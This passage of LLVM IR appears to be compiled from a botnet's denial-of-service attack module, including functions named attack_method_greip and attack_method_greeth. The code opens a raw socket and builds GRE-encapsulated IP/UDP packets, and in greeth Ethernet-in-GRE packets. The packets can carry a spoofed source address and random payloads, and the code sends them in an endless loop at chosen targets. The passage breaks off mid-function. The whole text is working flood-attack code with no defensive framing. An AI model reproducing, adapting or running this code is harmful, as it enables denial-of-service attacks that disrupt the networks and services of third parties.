  %.09 = phi i8* [ %14, %12 ], [ %3, %4 ], [ %3, %.loopexit.loopexit ]
  ret i8* %.09
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @util_atoi(i8* nonnull %5, i32 10) #10
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

declare i32 @util_atoi(i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @inet_addr(i8* nonnull %5) #10
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %23 = trunc i32 %22 to i8
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i32 0)
  %25 = trunc i32 %24 to i8
  %26 = load i32, i32* @LOCAL_ADDR, align 4
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %26)
  %28 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %29 = icmp eq i32 %28, -1
  br i1 %29, label %284, label %30

; <label>:30:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %31 = bitcast i32* %5 to i8*
  %32 = call i32 @setsockopt(i32 %28, i32 0, i32 3, i8* nonnull %31, i32 4) #10
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %92, label %.preheader125

.preheader125:                                    ; preds = %30
  store i32 0, i32* %5, align 4
  %34 = zext i8 %0 to i32
  %35 = icmp eq i8 %0, 0
  %.pre135 = sext i32 %21 to i64
  %.pre136 = add nsw i64 %.pre135, 52
  br i1 %35, label %.preheader, label %.lr.ph127

.lr.ph127:                                        ; preds = %.preheader125
  %36 = trunc i64 %.pre136 to i16
  %37 = icmp eq i8 %16, 0
  %38 = add nsw i64 %.pre135, 28
  %39 = trunc i64 %38 to i16
  %40 = xor i16 %12, -1
  %41 = icmp eq i8 %25, 0
  %42 = add nsw i64 %.pre135, 8
  %43 = trunc i64 %42 to i16
  %44 = zext i8 %0 to i64
  br i1 %37, label %.lr.ph127.split.preheader, label %.lr.ph127.split.us.preheader

.lr.ph127.split.us.preheader:                     ; preds = %.lr.ph127
  br label %.lr.ph127.split.us

.lr.ph127.split.preheader:                        ; preds = %.lr.ph127
  br label %.lr.ph127.split

.lr.ph127.split.us:                               ; preds = %.lr.ph127.split.us.preheader, %.lr.ph127.split.us
  %indvars.iv132 = phi i64 [ %indvars.iv.next133, %.lr.ph127.split.us ], [ 0, %.lr.ph127.split.us.preheader ]
  %45 = call noalias i8* @calloc(i64 1510, i64 8) #10
  %46 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv132
  store i8* %45, i8** %46, align 8
  %47 = getelementptr inbounds i8, i8* %45, i64 24
  %48 = getelementptr inbounds i8, i8* %45, i64 44
  store i8 69, i8* %45, align 4
  %49 = getelementptr inbounds i8, i8* %45, i64 1
  store i8 %10, i8* %49, align 1
  %50 = call zeroext i16 @htons(i16 zeroext %36) #11
  %51 = getelementptr inbounds i8, i8* %45, i64 2
  %52 = bitcast i8* %51 to i16*
  store i16 %50, i16* %52, align 2
  %53 = call zeroext i16 @htons(i16 zeroext %12) #11
  %54 = getelementptr inbounds i8, i8* %45, i64 4
  %55 = bitcast i8* %54 to i16*
  store i16 %53, i16* %55, align 4
  %56 = getelementptr inbounds i8, i8* %45, i64 8
  store i8 %14, i8* %56, align 4
  %57 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %58 = getelementptr inbounds i8, i8* %45, i64 6
  %59 = bitcast i8* %58 to i16*
  store i16 %57, i16* %59, align 2
  %60 = getelementptr inbounds i8, i8* %45, i64 9
  store i8 47, i8* %60, align 1
  %61 = getelementptr inbounds i8, i8* %45, i64 12
  %62 = bitcast i8* %61 to i32*
  store i32 %27, i32* %62, align 4
  %63 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv132, i32 1
  %64 = load i32, i32* %63, align 4
  %65 = getelementptr inbounds i8, i8* %45, i64 16
  %66 = bitcast i8* %65 to i32*
  store i32 %64, i32* %66, align 4
  %67 = call zeroext i16 @htons(i16 zeroext 2048) #11
  %68 = getelementptr inbounds i8, i8* %45, i64 22
  %69 = bitcast i8* %68 to i16*
  store i16 %67, i16* %69, align 2
  store i8 69, i8* %47, align 4
  %70 = getelementptr inbounds i8, i8* %45, i64 25
  store i8 %10, i8* %70, align 1
  %71 = call zeroext i16 @htons(i16 zeroext %39) #11
  %72 = getelementptr inbounds i8, i8* %45, i64 26
  %73 = bitcast i8* %72 to i16*
  store i16 %71, i16* %73, align 2
  %74 = call zeroext i16 @htons(i16 zeroext %40) #11
  %75 = getelementptr inbounds i8, i8* %45, i64 28
  %76 = bitcast i8* %75 to i16*
  store i16 %74, i16* %76, align 4
  %77 = getelementptr inbounds i8, i8* %45, i64 32
  store i8 %14, i8* %77, align 4
  %78 = getelementptr inbounds i8, i8* %45, i64 30
  %79 = bitcast i8* %78 to i16*
  store i16 %57, i16* %79, align 2
  %80 = getelementptr inbounds i8, i8* %45, i64 33
  store i8 17, i8* %80, align 1
  %. = select i1 %41, i32 1023, i32 %64
  %81 = getelementptr inbounds i8, i8* %45, i64 40
  %82 = bitcast i8* %81 to i32*
  store i32 %., i32* %82, align 4
  %83 = call zeroext i16 @htons(i16 zeroext %18) #11
  %84 = bitcast i8* %48 to i16*
  store i16 %83, i16* %84, align 2
  %85 = call zeroext i16 @htons(i16 zeroext %20) #11
  %86 = getelementptr inbounds i8, i8* %45, i64 46
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = call zeroext i16 @htons(i16 zeroext %43) #11
  %89 = getelementptr inbounds i8, i8* %45, i64 48
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 2
  %indvars.iv.next133 = add nsw i64 %indvars.iv132, 1
  %91 = icmp slt i64 %indvars.iv.next133, %44
  br i1 %91, label %.lr.ph127.split.us, label %..preheader_crit_edge.loopexit144

; <label>:92:                                     ; preds = %30
  %93 = call i32 @close(i32 %28) #10
  br label %284

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph127.split
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit144:                ; preds = %.lr.ph127.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit144, %..preheader_crit_edge.loopexit
  %.lcssa128.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next133, %..preheader_crit_edge.loopexit144 ]
  %.lcssa128 = trunc i64 %.lcssa128.in to i32
  store i32 %.lcssa128, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader125, %..preheader_crit_edge
  %94 = icmp eq i32 %27, -1
  %95 = and i32 %11, 65535
  %96 = icmp eq i32 %95, 65535
  %97 = and i32 %17, 65535
  %98 = icmp eq i32 %97, 65535
  %99 = and i32 %19, 65535
  %100 = icmp eq i32 %99, 65535
  %101 = icmp eq i8 %25, 0
  %102 = icmp eq i8 %23, 0
  %103 = add i32 %21, 8
  br label %.loopexit

.lr.ph127.split:                                  ; preds = %.lr.ph127.split.preheader, %.lr.ph127.split
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph127.split ], [ 0, %.lr.ph127.split.preheader ]
  %104 = call noalias i8* @calloc(i64 1510, i64 8) #10
  %105 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %104, i8** %105, align 8
  %106 = getelementptr inbounds i8, i8* %104, i64 24
  %107 = getelementptr inbounds i8, i8* %104, i64 44
  store i8 69, i8* %104, align 4
  %108 = getelementptr inbounds i8, i8* %104, i64 1
  store i8 %10, i8* %108, align 1
  %109 = call zeroext i16 @htons(i16 zeroext %36) #11
  %110 = getelementptr inbounds i8, i8* %104, i64 2
  %111 = bitcast i8* %110 to i16*
  store i16 %109, i16* %111, align 2
  %112 = call zeroext i16 @htons(i16 zeroext %12) #11
  %113 = getelementptr inbounds i8, i8* %104, i64 4
  %114 = bitcast i8* %113 to i16*
  store i16 %112, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %104, i64 8
  store i8 %14, i8* %115, align 4
  %116 = getelementptr inbounds i8, i8* %104, i64 9
  store i8 47, i8* %116, align 1
  %117 = getelementptr inbounds i8, i8* %104, i64 12
  %118 = bitcast i8* %117 to i32*
  store i32 %27, i32* %118, align 4
  %119 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %120 = load i32, i32* %119, align 4
  %121 = getelementptr inbounds i8, i8* %104, i64 16
  %122 = bitcast i8* %121 to i32*
  store i32 %120, i32* %122, align 4
  %123 = call zeroext i16 @htons(i16 zeroext 2048) #11
  %124 = getelementptr inbounds i8, i8* %104, i64 22
  %125 = bitcast i8* %124 to i16*
  store i16 %123, i16* %125, align 2
  store i8 69, i8* %106, align 4
  %126 = getelementptr inbounds i8, i8* %104, i64 25
  store i8 %10, i8* %126, align 1
  %127 = call zeroext i16 @htons(i16 zeroext %39) #11
  %128 = getelementptr inbounds i8, i8* %104, i64 26
  %129 = bitcast i8* %128 to i16*
  store i16 %127, i16* %129, align 2
  %130 = call zeroext i16 @htons(i16 zeroext %40) #11
  %131 = getelementptr inbounds i8, i8* %104, i64 28
  %132 = bitcast i8* %131 to i16*
  store i16 %130, i16* %132, align 4
  %133 = getelementptr inbounds i8, i8* %104, i64 32
  store i8 %14, i8* %133, align 4
  %134 = getelementptr inbounds i8, i8* %104, i64 33
  store i8 17, i8* %134, align 1
  %.140 = select i1 %41, i32 1023, i32 %120
  %135 = getelementptr inbounds i8, i8* %104, i64 40
  %136 = bitcast i8* %135 to i32*
  store i32 %.140, i32* %136, align 4
  %137 = call zeroext i16 @htons(i16 zeroext %18) #11
  %138 = bitcast i8* %107 to i16*
  store i16 %137, i16* %138, align 2
  %139 = call zeroext i16 @htons(i16 zeroext %20) #11
  %140 = getelementptr inbounds i8, i8* %104, i64 46
  %141 = bitcast i8* %140 to i16*
  store i16 %139, i16* %141, align 2
  %142 = call zeroext i16 @htons(i16 zeroext %43) #11
  %143 = getelementptr inbounds i8, i8* %104, i64 48
  %144 = bitcast i8* %143 to i16*
  store i16 %142, i16* %144, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %145 = icmp slt i64 %indvars.iv.next, %44
  br i1 %145, label %.lr.ph127.split, label %..preheader_crit_edge.loopexit

.loopexit.loopexit:                               ; preds = %187
  br label %.loopexit.backedge

.loopexit.loopexit143:                            ; preds = %255
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %35, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit143
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %94, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %187
  %storemerge124126.us = phi i32 [ %214, %187 ], [ 0, %.lr.ph.split.us.preheader ]
  %146 = sext i32 %storemerge124126.us to i64
  %147 = getelementptr inbounds i8*, i8** %8, i64 %146
  %148 = load i8*, i8** %147, align 8
  %149 = getelementptr inbounds i8, i8* %148, i64 24
  %150 = bitcast i8* %149 to %struct.iphdr*
  %151 = getelementptr inbounds i8, i8* %148, i64 44
  %152 = getelementptr inbounds i8, i8* %148, i64 52
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %146, i32 2
  %154 = load i8, i8* %153, align 4
  %155 = icmp ult i8 %154, 32
  br i1 %155, label %156, label %163

; <label>:156:                                    ; preds = %.lr.ph.split.us
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %146, i32 1
  %158 = load i32, i32* %157, align 4
  %159 = call i32 @ntohl(i32 %158) #11
  %160 = call i32 @htonl(i32 %159) #11
  %161 = getelementptr inbounds i8, i8* %148, i64 16
  %162 = bitcast i8* %161 to i32*
  store i32 %160, i32* %162, align 4
  br label %163

; <label>:163:                                    ; preds = %.lr.ph.split.us, %156
  %164 = getelementptr inbounds i8, i8* %148, i64 12
  %165 = bitcast i8* %164 to i32*
  store i32 0, i32* %165, align 4
  br i1 %96, label %166, label %171

; <label>:166:                                    ; preds = %163
  %167 = getelementptr inbounds i8, i8* %148, i64 4
  %168 = bitcast i8* %167 to i16*
  store i16 0, i16* %168, align 4
  %169 = getelementptr inbounds i8, i8* %148, i64 28
  %170 = bitcast i8* %169 to i16*
  store i16 999, i16* %170, align 4
  br label %171

; <label>:171:                                    ; preds = %166, %163
  br i1 %98, label %172, label %174

; <label>:172:                                    ; preds = %171
  %173 = bitcast i8* %151 to i16*
  store i16 0, i16* %173, align 2
  br label %174

; <label>:174:                                    ; preds = %172, %171
  br i1 %100, label %175, label %178

; <label>:175:                                    ; preds = %174
  %176 = getelementptr inbounds i8, i8* %148, i64 46
  %177 = bitcast i8* %176 to i16*
  store i16 0, i16* %177, align 2
  br label %178

; <label>:178:                                    ; preds = %175, %174
  br i1 %101, label %183, label %179

; <label>:179:                                    ; preds = %178
  %180 = getelementptr inbounds i8, i8* %148, i64 16
  %181 = bitcast i8* %180 to i32*
  %182 = load i32, i32* %181, align 4
  br label %183

; <label>:183:                                    ; preds = %179, %178
  %.sink3.us = phi i32 [ %182, %179 ], [ 0, %178 ]
  %184 = getelementptr inbounds i8, i8* %148, i64 40
  %185 = bitcast i8* %184 to i32*
  store i32 %.sink3.us, i32* %185, align 4
  br i1 %102, label %187, label %186

; <label>:186:                                    ; preds = %183
  call void @rand_str(i8* nonnull %152, i32 %21)
  %.pre134 = load i32, i32* %5, align 4
  br label %187

; <label>:187:                                    ; preds = %186, %183
  %188 = phi i32 [ %.pre134, %186 ], [ %storemerge124126.us, %183 ]
  %189 = getelementptr inbounds i8, i8* %148, i64 10
  %190 = bitcast i8* %189 to i16*
  store i16 0, i16* %190, align 2
  %191 = bitcast i8* %148 to i16*
  %192 = call zeroext i16 @checksum_generic(i16* %191, i32 20)
  store i16 %192, i16* %190, align 2
  %193 = getelementptr inbounds i8, i8* %148, i64 34
  %194 = bitcast i8* %193 to i16*
  store i16 0, i16* %194, align 2
  %195 = bitcast i8* %149 to i16*
  %196 = call zeroext i16 @checksum_generic(i16* %195, i32 20)
  store i16 %196, i16* %194, align 2
  %197 = getelementptr inbounds i8, i8* %148, i64 50
  %198 = bitcast i8* %197 to i16*
  store i16 0, i16* %198, align 2
  %199 = getelementptr inbounds i8, i8* %148, i64 48
  %200 = bitcast i8* %199 to i16*
  %201 = load i16, i16* %200, align 2
  %202 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %150, i8* nonnull %151, i16 zeroext %201, i32 %103)
  store i16 %202, i16* %198, align 2
  %203 = sext i32 %188 to i64
  %204 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %203, i32 0, i32 0
  store i16 2, i16* %204, align 4
  %205 = getelementptr inbounds i8, i8* %148, i64 16
  %206 = bitcast i8* %205 to i32*
  %207 = load i32, i32* %206, align 4
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %203, i32 0, i32 2, i32 0
  store i32 %207, i32* %208, align 4
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %203, i32 0, i32 1
  store i16 0, i16* %209, align 2
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %203, i32 0
  %211 = bitcast %struct.sockaddr_in* %210 to %struct.sockaddr*
  %212 = call i64 @sendto(i32 %28, i8* nonnull %148, i64 %.pre136, i32 16384, %struct.sockaddr* %211, i32 16) #10
  %213 = load i32, i32* %5, align 4
  %214 = add nsw i32 %213, 1
  store i32 %214, i32* %5, align 4
  %215 = icmp slt i32 %214, %34
  br i1 %215, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %255
  %storemerge124126 = phi i32 [ %282, %255 ], [ 0, %.lr.ph.split.preheader ]
  %216 = sext i32 %storemerge124126 to i64
  %217 = getelementptr inbounds i8*, i8** %8, i64 %216
  %218 = load i8*, i8** %217, align 8
  %219 = getelementptr inbounds i8, i8* %218, i64 24
  %220 = bitcast i8* %219 to %struct.iphdr*
  %221 = getelementptr inbounds i8, i8* %218, i64 44
  %222 = getelementptr inbounds i8, i8* %218, i64 52
  %223 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %216, i32 2
  %224 = load i8, i8* %223, align 4
  %225 = icmp ult i8 %224, 32
  br i1 %225, label %226, label %233

; <label>:226:                                    ; preds = %.lr.ph.split
  %227 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %216, i32 1
  %228 = load i32, i32* %227, align 4
  %229 = call i32 @ntohl(i32 %228) #11
  %230 = call i32 @htonl(i32 %229) #11
  %231 = getelementptr inbounds i8, i8* %218, i64 16
  %232 = bitcast i8* %231 to i32*
  store i32 %230, i32* %232, align 4
  br label %233

; <label>:233:                                    ; preds = %.lr.ph.split, %226
  br i1 %96, label %234, label %239

; <label>:234:                                    ; preds = %233
  %235 = getelementptr inbounds i8, i8* %218, i64 4
  %236 = bitcast i8* %235 to i16*
  store i16 0, i16* %236, align 4
  %237 = getelementptr inbounds i8, i8* %218, i64 28
  %238 = bitcast i8* %237 to i16*
  store i16 999, i16* %238, align 4
  br label %239

; <label>:239:                                    ; preds = %234, %233
  br i1 %98, label %240, label %242

; <label>:240:                                    ; preds = %239
  %241 = bitcast i8* %221 to i16*
  store i16 0, i16* %241, align 2
  br label %242

; <label>:242:                                    ; preds = %240, %239
  br i1 %100, label %243, label %246

; <label>:243:                                    ; preds = %242
  %244 = getelementptr inbounds i8, i8* %218, i64 46
  %245 = bitcast i8* %244 to i16*
  store i16 0, i16* %245, align 2
  br label %246

; <label>:246:                                    ; preds = %243, %242
  br i1 %101, label %251, label %247

; <label>:247:                                    ; preds = %246
  %248 = getelementptr inbounds i8, i8* %218, i64 16
  %249 = bitcast i8* %248 to i32*
  %250 = load i32, i32* %249, align 4
  br label %251

; <label>:251:                                    ; preds = %246, %247
  %.sink3 = phi i32 [ %250, %247 ], [ 0, %246 ]
  %252 = getelementptr inbounds i8, i8* %218, i64 40
  %253 = bitcast i8* %252 to i32*
  store i32 %.sink3, i32* %253, align 4
  br i1 %102, label %255, label %254

; <label>:254:                                    ; preds = %251
  call void @rand_str(i8* nonnull %222, i32 %21)
  %.pre = load i32, i32* %5, align 4
  br label %255

; <label>:255:                                    ; preds = %251, %254
  %256 = phi i32 [ %storemerge124126, %251 ], [ %.pre, %254 ]
  %257 = getelementptr inbounds i8, i8* %218, i64 10
  %258 = bitcast i8* %257 to i16*
  store i16 0, i16* %258, align 2
  %259 = bitcast i8* %218 to i16*
  %260 = call zeroext i16 @checksum_generic(i16* %259, i32 20)
  store i16 %260, i16* %258, align 2
  %261 = getelementptr inbounds i8, i8* %218, i64 34
  %262 = bitcast i8* %261 to i16*
  store i16 0, i16* %262, align 2
  %263 = bitcast i8* %219 to i16*
  %264 = call zeroext i16 @checksum_generic(i16* %263, i32 20)
  store i16 %264, i16* %262, align 2
  %265 = getelementptr inbounds i8, i8* %218, i64 50
  %266 = bitcast i8* %265 to i16*
  store i16 0, i16* %266, align 2
  %267 = getelementptr inbounds i8, i8* %218, i64 48
  %268 = bitcast i8* %267 to i16*
  %269 = load i16, i16* %268, align 2
  %270 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %220, i8* nonnull %221, i16 zeroext %269, i32 %103)
  store i16 %270, i16* %266, align 2
  %271 = sext i32 %256 to i64
  %272 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %271, i32 0, i32 0
  store i16 2, i16* %272, align 4
  %273 = getelementptr inbounds i8, i8* %218, i64 16
  %274 = bitcast i8* %273 to i32*
  %275 = load i32, i32* %274, align 4
  %276 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %271, i32 0, i32 2, i32 0
  store i32 %275, i32* %276, align 4
  %277 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %271, i32 0, i32 1
  store i16 0, i16* %277, align 2
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %271, i32 0
  %279 = bitcast %struct.sockaddr_in* %278 to %struct.sockaddr*
  %280 = call i64 @sendto(i32 %28, i8* nonnull %218, i64 %.pre136, i32 16384, %struct.sockaddr* %279, i32 16) #10
  %281 = load i32, i32* %5, align 4
  %282 = add nsw i32 %281, 1
  store i32 %282, i32* %5, align 4
  %283 = icmp slt i32 %282, %34
  br i1 %283, label %.lr.ph.split, label %.loopexit.loopexit143

; <label>:284:                                    ; preds = %4, %92
  ret void
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = zext i8 %0 to i64
  %10 = tail call noalias i8* @calloc(i64 %9, i64 8) #10
  %11 = bitcast i8* %10 to i8**
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %13 = trunc i32 %12 to i8
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %15 = trunc i32 %14 to i16
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %19 = trunc i32 %18 to i8
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %23 = trunc i32 %22 to i16
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %26 = trunc i32 %25 to i8
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i32 0)
  %28 = trunc i32 %27 to i8
  %29 = load i32, i32* @LOCAL_ADDR, align 4
  %30 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %29)
  %31 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %305, label %33

; <label>:33:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %34 = bitcast i32* %5 to i8*
  %35 = call i32 @setsockopt(i32 %31, i32 0, i32 3, i8* nonnull %34, i32 4) #10
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %98, label %.preheader132

.preheader132:                                    ; preds = %33
  store i32 0, i32* %5, align 4
  %37 = zext i8 %0 to i32
  %38 = icmp eq i8 %0, 0
  %.pre = sext i32 %24 to i64
  %.pre141 = add nsw i64 %.pre, 66
  br i1 %38, label %.preheader, label %.lr.ph134

.lr.ph134:                                        ; preds = %.preheader132
  %39 = trunc i64 %.pre141 to i16
  %40 = icmp eq i8 %19, 0
  %41 = add nsw i64 %.pre, 28
  %42 = trunc i64 %41 to i16
  %43 = xor i16 %15, -1
  %44 = icmp eq i8 %28, 0
  %45 = add nsw i64 %.pre, 8
  %46 = trunc i64 %45 to i16
  %47 = zext i8 %0 to i64
  br i1 %40, label %.lr.ph134.split.preheader, label %.lr.ph134.split.us.preheader

.lr.ph134.split.us.preheader:                     ; preds = %.lr.ph134
  br label %.lr.ph134.split.us

.lr.ph134.split.preheader:                        ; preds = %.lr.ph134
  br label %.lr.ph134.split

.lr.ph134.split.us:                               ; preds = %.lr.ph134.split.us.preheader, %.lr.ph134.split.us
  %indvars.iv139 = phi i64 [ %indvars.iv.next140, %.lr.ph134.split.us ], [ 0, %.lr.ph134.split.us.preheader ]
  %48 = call noalias i8* @calloc(i64 1510, i64 8) #10
  %49 = getelementptr inbounds i8*, i8** %11, i64 %indvars.iv139
  store i8* %48, i8** %49, align 8
  %50 = getelementptr inbounds i8, i8* %48, i64 38
  %51 = getelementptr inbounds i8, i8* %48, i64 58
  store i8 69, i8* %48, align 4
  %52 = getelementptr inbounds i8, i8* %48, i64 1
  store i8 %13, i8* %52, align 1
  %53 = call zeroext i16 @htons(i16 zeroext %39) #11
  %54 = getelementptr inbounds i8, i8* %48, i64 2
  %55 = bitcast i8* %54 to i16*
  store i16 %53, i16* %55, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %15) #11
  %57 = getelementptr inbounds i8, i8* %48, i64 4
  %58 = bitcast i8* %57 to i16*
  store i16 %56, i16* %58, align 4
  %59 = getelementptr inbounds i8, i8* %48, i64 8
  store i8 %17, i8* %59, align 4
  %60 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %61 = getelementptr inbounds i8, i8* %48, i64 6
  %62 = bitcast i8* %61 to i16*
  store i16 %60, i16* %62, align 2
  %63 = getelementptr inbounds i8, i8* %48, i64 9
  store i8 47, i8* %63, align 1
  %64 = getelementptr inbounds i8, i8* %48, i64 12
  %65 = bitcast i8* %64 to i32*
  store i32 %30, i32* %65, align 4
  %66 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv139, i32 1
  %67 = load i32, i32* %66, align 4
  %68 = getelementptr inbounds i8, i8* %48, i64 16
  %69 = bitcast i8* %68 to i32*
  store i32 %67, i32* %69, align 4
  %70 = call zeroext i16 @htons(i16 zeroext 25944) #11
  %71 = getelementptr inbounds i8, i8* %48, i64 22
  %72 = bitcast i8* %71 to i16*
  store i16 %70, i16* %72, align 2
  %73 = call zeroext i16 @htons(i16 zeroext 2048) #11
  %74 = getelementptr inbounds i8, i8* %48, i64 36
  %75 = bitcast i8* %74 to i16*
  store i16 %73, i16* %75, align 1
  store i8 69, i8* %50, align 4
  %76 = getelementptr inbounds i8, i8* %48, i64 39
  store i8 %13, i8* %76, align 1
  %77 = call zeroext i16 @htons(i16 zeroext %42) #11
  %78 = getelementptr inbounds i8, i8* %48, i64 40
  %79 = bitcast i8* %78 to i16*
  store i16 %77, i16* %79, align 2
  %80 = call zeroext i16 @htons(i16 zeroext %43) #11
